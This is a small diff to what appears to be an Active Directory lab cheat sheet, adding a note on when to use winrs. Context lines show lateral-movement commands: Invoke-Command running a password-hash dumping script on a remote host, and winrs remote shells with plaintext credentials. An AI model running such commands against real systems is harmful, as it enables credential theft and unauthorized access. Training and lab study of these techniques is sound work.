@@ -1620,6 +1620,7 @@ Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock 
 Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -FilePath C:\scripts\Get-PassHahes.ps1   #check who you are
 ```
 ### Connect to different machines using winrs
+use it if you have admin access on a different machine
 ```
 winrs -r:dcorp-adminsrv cmd
 winrs -remote:server1 -u:server1\administrator -p:Pass@123 hostname
